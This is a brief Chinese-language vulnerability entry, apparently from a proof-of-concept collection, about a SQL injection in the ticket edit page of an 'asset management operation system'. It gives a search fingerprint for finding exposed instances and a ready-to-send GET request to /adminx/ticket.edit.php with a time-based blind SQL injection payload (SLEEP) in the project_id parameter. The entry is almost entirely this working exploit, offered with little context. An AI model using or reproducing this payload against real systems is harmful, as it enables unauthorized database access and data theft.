# 资产管理运营系统ticket存在SQL注入漏洞

资产管理运营系统 ｜ SQL注入 ｜ —
- **指纹**：`body="不要着急，点此"`
- **请求**：`GET /adminx/ticket.edit.php?project_id=1%20AND%20(SELECT%207357%20FROM%20(SELECT(SLEEP(2)))UPCw) HTTP/1.1`
- **响应特征**：200